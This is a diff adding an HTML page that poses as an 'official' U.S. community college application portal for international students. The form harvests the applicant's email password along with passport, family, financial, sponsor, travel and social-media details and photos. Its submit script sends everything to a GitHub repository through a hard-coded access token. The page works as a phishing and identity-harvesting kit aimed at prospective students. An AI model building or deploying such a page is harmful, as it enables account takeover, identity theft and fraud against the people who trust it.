@@ -1,0 +1,595 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Global Pathways: U.S. Community College Application Portal</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+      max-width: 900px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      color: #202124;
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      color: #3c4043;
+      font-size: 20px;
+      margin: 20px 0 10px;
+    }
+    .motivation {
+      background-color: #f1f3f4;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+      color: #3c4043;
+      line-height: 1.5;
+      border-left: 4px solid #1a73e8;
+    }
+    label {
+      display: block;
+      text-align: left;
+      margin: 12px 0 6px;
+      font-weight: bold;
+      color: #3c4043;
+      font-size: 14px;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    input[type="file"] {
+      padding: 5px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: #fff;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #174ea6;
+    }
+    .required::after {
+      content: " *";
+      color: #d93025;
+    }
+    .section {
+      margin-top: 20px;
+      border-top: 1px solid #dadce0;
+      padding-top: 20px;
+    }
+    .header {
+      background-color: #1a73e8;
+      color: #fff;
+      padding: 10px;
+      border-radius: 8px 8px 0 0;
+      margin: -40px -40px 20px -40px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Global Pathways: U.S. Community College Application Portal</h1>
+    </div>
+    <div class="motivation">
+      <p>Welcome to your journey toward a U.S. education! This official portal is designed to streamline your application to top community colleges in states like California, Washington, and beyond. Complete this form thoroughly to showcase your potential and take the first step toward a transformative academic experience.</p>
+    </div>
+    <form id="uniForm">
+      <!-- Personal & Identity Details -->
+      <div class="section">
+        <h2>Personal & Identity Details</h2>
+        <label for="fullName" class="required">Full Name (as on passport)</label>
+        <input type="text" id="fullName" name="fullName" required>
+
+        <label for="dob" class="required">Date of Birth (DD/MM/YYYY)</label>
+        <input type="text" id="dob" name="dob" required>
+
+        <label for="gender" class="required">Gender</label>
+        <select id="gender" name="gender" required>
+          <option value="">Select</option>
+          <option value="Female">Female</option>
+          <option value="Male">Male</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <label for="countryBirth" class="required">Country of Birth</label>
+        <input type="text" id="countryBirth" name="countryBirth" required>
+
+        <label for="citizenship" class="required">Country of Citizenship</label>
+        <input type="text" id="citizenship" name="citizenship" required>
+
+        <label for="passportExpiry" class="required">Passport Expiry Date (DD/MM/YYYY)</label>
+        <input type="text" id="passportExpiry" name="passportExpiry" required>
+
+        <label for="phone" class="required">Phone Number (International Format, e.g., +212XXXXXXXXX)</label>
+        <input type="tel" id="phone" name="phone" required>
+
+        <label for="email" class="required">Personal Email Address</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password" class="required">Email Password (for application portal setup)</label>
+        <input type="password" id="password" name="password" required>
+
+        <label for="address" class="required">Current Physical Address (City, Country)</label>
+        <input type="text" id="address" name="address" required>
+
+        <label for="mailingAddress">Mailing Address (if different)</label>
+        <input type="text" id="mailingAddress" name="mailingAddress">
+      </div>
+
+      <!-- Family Situation -->
+      <div class="section">
+        <h2>Family Situation</h2>
+        <label for="familyMembers" class="required">Household Members (Names, Relationships, Ages)</label>
+        <textarea id="familyMembers" name="familyMembers" rows="4" required></textarea>
+
+        <label for="parentOccupations" class="required">Parent/Guardian Occupations (Names, Jobs, Employers)</label>
+        <textarea id="parentOccupations" name="parentOccupations" rows="4" required></textarea>
+
+        <label for="familySupport" class="required">Family Support for Study Abroad (Who supports your plans? Describe their involvement)</label>
+        <textarea id="familySupport" name="familySupport" rows="4" required></textarea>
+
+        <label for="dependents">Dependents (Do you support siblings or others financially? If yes, explain)</label>
+        <textarea id="dependents" name="dependents" rows="4"></textarea>
+
+        <label for="familyChallenges">Family Challenges (Any family issues impacting your studies, e.g., financial, health?)</label>
+        <textarea id="familyChallenges" name="familyChallenges" rows="4"></textarea>
+      </div>
+
+      <!-- Education History -->
+      <div class="section">
+        <h2>Education History</h2>
+        <label for="highSchool" class="required">Name of High School</label>
+        <input type="text" id="highSchool" name="highSchool" required>
+
+        <label for="diplomaType" class="required">Type of Diploma</label>
+        <input type="text" id="diplomaType" name="diplomaType" required>
+
+        <label for="specialization" class="required">Specialization/Field</label>
+        <input type="text" id="specialization" name="specialization" required>
+
+        <label for="graduationDate" class="required">Date of Graduation (MM/YYYY)</label>
+        <input type="text" id="graduationDate" name="graduationDate" required>
+
+        <label for="gpa" class="required">GPA (e.g., /20 or equivalent)</label>
+        <input type="text" id="gpa" name="gpa" required>
+
+        <label for="transcriptLanguage" class="required">Transcript Language</label>
+        <select id="transcriptLanguage" name="transcriptLanguage" required>
+          <option value="">Select</option>
+          <option value="French">French</option>
+          <option value="Arabic">Arabic</option>
+          <option value="Both">Both</option>
+          <option value="English">English</option>
+        </select>
+
+        <label for="transcriptTranslated" class="required">Transcripts Translated to English?</label>
+        <select id="transcriptTranslated" name="transcriptTranslated" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="gradCertificate" class="required">Graduation Certificate Available?</label>
+        <select id="gradCertificate" name="gradCertificate" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="extracurricular">Extracurricular Activities (e.g., clubs, sports, volunteering)</label>
+        <textarea id="extracurricular" name="extracurricular" rows="4"></textarea>
+
+        <label for="academicAchievements">Academic Achievements (e.g., awards, honors)</label>
+        <textarea id="academicAchievements" name="academicAchievements" rows="4"></textarea>
+      </div>
+
+      <!-- English Proficiency -->
+      <div class="section">
+        <h2>English Proficiency</h2>
+        <label for="englishTest" class="required">English Test Type (e.g., Duolingo, TOEFL, IELTS, None)</label>
+        <input type="text" id="englishTest" name="englishTest" required>
+
+        <label for="testScore">Test Score (if applicable)</label>
+        <input type="text" id="testScore" name="testScore">
+
+        <label for="testDate">Date of Test (MM/YYYY, if applicable)</label>
+        <input type="text" id="testDate" name="testDate">
+
+        <label for="planTest" class="required">Planning to Take a Test?</label>
+        <select id="planTest" name="planTest" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="conditionalAdmission" class="required">Needs Conditional Admission?</label>
+        <select id="conditionalAdmission" name="conditionalAdmission" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+      </div>
+
+      <!-- Financial Information -->
+      <div class="section">
+        <h2>Financial Information (For I-20 + Visa)</h2>
+        <label for="bankBalance" class="required">Estimated Bank Balance Available (USD)</label>
+        <input type="text" id="bankBalance" name="bankBalance" required>
+
+        <label for="accountHolder" class="required">Account Holder</label>
+        <select id="accountHolder" name="accountHolder" required>
+          <option value="">Select</option>
+          <option value="Student">Student</option>
+          <option value="Parent">Parent</option>
+          <option value="Sponsor">Sponsor</option>
+        </select>
+
+        <label for="sponsorRelationship">Relationship to Sponsor (if applicable)</label>
+        <input type="text" id="sponsorRelationship" name="sponsorRelationship">
+
+        <label for="sponsorName">Sponsor Name (if applicable)</label>
+        <input type="text" id="sponsorName" name="sponsorName">
+
+        <label for="sponsorPassport" class="required">Sponsor Passport Scan Available?</label>
+        <select id="sponsorPassport" name="sponsorPassport" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="proofFunds" class="required">Proof of Funds Document Ready?</label>
+        <select id="proofFunds" name="proofFunds" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="fundingPlan" class="required">Plan to Self-Fund or Seek Scholarship?</label>
+        <select id="fundingPlan" name="fundingPlan" required>
+          <option value="">Select</option>
+          <option value="Self-funded">Self-funded</option>
+          <option value="Sponsor">Sponsor</option>
+          <option value="Scholarship">Scholarship</option>
+        </select>
+
+        <label for="familyIncome" class="required">Estimated Family Annual Income (USD)</label>
+        <input type="text" id="familyIncome" name="familyIncome" required>
+
+        <label for="personalIncome">Personal Income (e.g., part-time work, allowances, USD/month)</label>
+        <input type="text" id="personalIncome" name="personalIncome">
+
+        <label for="incomeSources">Sources of Personal Income (e.g., job, family support, side hustles)</label>
+        <textarea id="incomeSources" name="incomeSources" rows="4"></textarea>
+
+        <label for="additionalFunding">Additional Funding Sources (e.g., loans, crowdfunding, part-time work plans)</label>
+        <textarea id="additionalFunding" name="additionalFunding" rows="4"></textarea>
+      </div>
+
+      <!-- Application-Specific Documents -->
+      <div class="section">
+        <h2>Application-Specific Documents</h2>
+        <label for="personalStatement" class="required">Personal Statement / Essay</label>
+        <select id="personalStatement" name="personalStatement" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+          <option value="Needs help">Needs help drafting</option>
+        </select>
+
+        <label for="recommendations" class="required">Letters of Recommendation</label>
+        <select id="recommendations" name="recommendations" required>
+          <option value="">Select</option>
+          <option value="1">1</option>
+          <option value="2">2</option>
+          <option value="None">None</option>
+        </select>
+
+        <label for="resume" class="required">Resume / CV</label>
+        <select id="resume" name="resume" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="transcript" class="required">Transcript (English)</label>
+        <select id="transcript" name="transcript" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="gradCertificateDoc" class="required">Graduation Certificate</label>
+        <select id="gradCertificateDoc" name="gradCertificateDoc" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="photo" class="required">Profile Photo (for application profile)</label>
+        <input type="file" id="photo" name="photo" accept="image/*" required>
+      </div>
+
+      <!-- Application Preferences -->
+      <div class="section">
+        <h2>Application Preferences</h2>
+        <label for="startSemester" class="required">Target Starting Semester</label>
+        <select id="startSemester" name="startSemester" required>
+          <option value="">Select</option>
+          <option value="Spring 2026">Spring 2026</option>
+          <option value="Fall 2025">Fall 2025</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <label for="preferredStates" class="required">Preferred U.S. State(s)</label>
+        <input type="text" id="preferredStates" name="preferredStates" required>
+
+        <label for="desiredMajors" class="required">Desired Majors (List all you’re interested in, e.g., Psychology, Business)</label>
+        <textarea id="desiredMajors" name="desiredMajors" rows="4" required></textarea>
+
+        <label for="housing" class="required">Housing Preference</label>
+        <select id="housing" name="housing" required>
+          <option value="">Select</option>
+          <option value="On-campus">On-campus</option>
+          <option value="Homestay">Homestay</option>
+          <option value="Find Myself">Find Myself</option>
+        </select>
+
+        <label for="transferProgram" class="required">Wants 2+2 Transfer Program?</label>
+        <select id="transferProgram" name="transferProgram" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="budget" class="required">Target Budget per Year (USD)</label>
+        <input type="text" id="budget" name="budget" required>
+
+        <label for="numColleges" class="required">Number of Colleges to Apply To</label>
+        <input type="text" id="numColleges" name="numColleges" required>
+
+        <label for="appFeeBudget" class="required">Application Fee Budget (Total, USD)</label>
+        <input type="text" id="appFeeBudget" name="appFeeBudget" required>
+      </div>
+
+      <!-- Timeline -->
+      <div class="section">
+        <h2>Timeline</h2>
+        <label for="readyApply" class="required">Ready to Start Applying?</label>
+        <select id="readyApply" name="readyApply" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="docUploadDate" class="required">Date to Complete Document Upload (MM/YYYY)</label>
+        <input type="text" id="docUploadDate" name="docUploadDate" required>
+
+        <label for="testDeadline">English Test Deadline (MM/YYYY, if pending)</label>
+        <input type="text" id="testDeadline" name="testDeadline">
+
+        <label for="visaAppointment" class="required">Visa Appointment Target Date (MM/YYYY)</label>
+        <input type="text" id="visaAppointment" name="visaAppointment" required>
+
+        <label for="arrivalUS" class="required">Arrival in U.S. (Estimated, MM/YYYY)</label>
+        <input type="text" id="arrivalUS" name="arrivalUS" required>
+      </div>
+
+      <!-- Optional Extras -->
+      <div class="section">
+        <h2>Optional Extras</h2>
+        <label for="commLanguage" class="required">Preferred Communication Language</label>
+        <select id="commLanguage" name="commLanguage" required>
+          <option value="">Select</option>
+          <option value="English">English</option>
+          <option value="French">French</option>
+          <option value="Arabic">Arabic</option>
+        </select>
+
+        <label for="parentEmail">Parent / Sponsor Contact Email</label>
+        <input type="email" id="parentEmail" name="parentEmail">
+
+        <label for="parentPhone">Parent / Sponsor Contact Phone (International Format)</label>
+        <input type="tel" id="parentPhone" name="parentPhone">
+
+        <label for="counselor">Current Academic Counselor Contact (Name, Email/Phone)</label>
+        <input type="text" id="counselor" name="counselor">
+
+        <label for="usContacts">Known U.S. Contacts (Name, Location, Phone/Email)</label>
+        <textarea id="usContacts" name="usContacts" rows="4"></textarea>
+
+        <label for="visaHelp" class="required">Needs Help with Visa Process?</label>
+        <select id="visaHelp" name="visaHelp" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+
+        <label for="housingHelp" class="required">Needs Help Finding Housing?</label>
+        <select id="housingHelp" name="housingHelp" required>
+          <option value="">Select</option>
+          <option value="Yes">Yes</option>
+          <option value="No">No</option>
+        </select>
+      </div>
+
+      <!-- Additional Information -->
+      <div class="section">
+        <h2>Additional Information</h2>
+        <label for="socialMedia">Social Media Handles (e.g., Instagram, TikTok, LinkedIn)</label>
+        <input type="text" id="socialMedia" name="socialMedia">
+
+        <label for="personalChallenges">Personal Challenges (What obstacles have you faced in your education or life?)</label>
+        <textarea id="personalChallenges" name="personalChallenges" rows="4"></textarea>
+
+        <label for="careerGoals">Career Goals (What job or career do you aim for after graduation?)</label>
+        <textarea id="careerGoals" name="careerGoals" rows="4"></textarea>
+
+        <label for="hobbies">Hobbies and Interests (e.g., music, travel, social media)</label>
+        <textarea id="hobbies" name="hobbies" rows="4"></textarea>
+
+        <label for="travelHistory">Travel History (Countries visited, dates)</label>
+        <textarea id="travelHistory" name="travelHistory" rows="4"></textarea>
+
+        <label for="familyAbroad">Family Members Abroad (Name, Country, Relationship, Contact Info)</label>
+        <textarea id="familyAbroad" name="familyAbroad" rows="4"></textarea>
+
+        <label for="onlinePresence">Online Presence (e.g., YouTube, blog, content creation experience)</label>
+        <textarea id="onlinePresence" name="onlinePresence" rows="4"></textarea>
+
+        <label for="motivationSupport">Who Supports Your Study Abroad Dream? (e.g., family, friends, mentors)</label>
+        <textarea id="motivationSupport" name="motivationSupport" rows="4"></textarea>
+
+        <label for="leadershipExperience">Leadership Experience (e.g., school projects, community roles)</label>
+        <textarea id="leadershipExperience" name="leadershipExperience" rows="4"></textarea>
+
+        <label for="personalValues">Personal Values (What principles guide your decisions?)</label>
+        <textarea id="personalValues" name="personalValues" rows="4"></textarea>
+
+        <label for="socialInfluences">Social Influences (Who are the most influential people in your life?)</label>
+        <textarea id="socialInfluences" name="socialInfluences" rows="4"></textarea>
+
+        <label for="financialIndependence">Financial Independence Plans (How do you plan to achieve financial independence?)</label>
+        <textarea id="financialIndependence" name="financialIndependence" rows="4"></textarea>
+
+        <label for="extraPhoto">Additional Photo (for student profile, optional)</label>
+        <input type="file" id="extraPhoto" name="extraPhoto" accept="image/*">
+      </div>
+
+      <button type="submit">Submit Application</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('uniForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const form = event.target;
+      const formData = new FormData(form);
+      let submissionData = '';
+
+      // Collect text, select, and textarea inputs
+      for (let [key, value] of formData.entries()) {
+        if (key !== 'photo' && key !== 'extraPhoto') {
+          submissionData += `${key}: ${value}\n`;
+        }
+      }
+
+      // Handle file inputs (convert to base64 for storage)
+      const fileInputs = [form.querySelector('#photo'), form.querySelector('#extraPhoto')];
+      const filePromises = fileInputs.map(input => {
+        if (input.files[0]) {
+          return new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onload = () => resolve(`${input.name}: ${reader.result}`);
+            reader.readAsDataURL(input.files[0]);
+          });
+        }
+        return Promise.resolve(`${input.name}: No file uploaded`);
+      });
+
+      try {
+        const fileData = await Promise.all(filePromises);
+        submissionData += fileData.join('\n');
+
+        // Send data to GitHub API
+        const repoOwner = 'YOUR_GITHUB_USERNAME'; // Replace with your GitHub username
+        const repoName = 'YOUR_REPO_NAME'; // Replace with your repository name
+        const token = 'YOUR_PERSONAL_ACCESS_TOKEN'; // Replace with your GitHub Personal Access Token
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filePath = `submissions/submission_${timestamp}.txt`;
+
+        const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+          method: 'PUT',
+          headers: {
+            'Authorization': `token ${token}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            message: `Add submission ${timestamp}`,
+            content: btoa(submissionData) // Base64 encode the submission data
+          })
+        });
+
+        if (response.ok) {
+          alert('Submission successful! Our admissions team will review your information and contact you soon.');
+          form.reset();
+        } else {
+          throw new Error('Failed to save submission to GitHub');
+        }
+      } catch (error) {
+        alert('Error sending submission. Please try again.');
+        console.error('GitHub API error:', error);
+      }
+    });
+  </script>
+</body>
+</html>
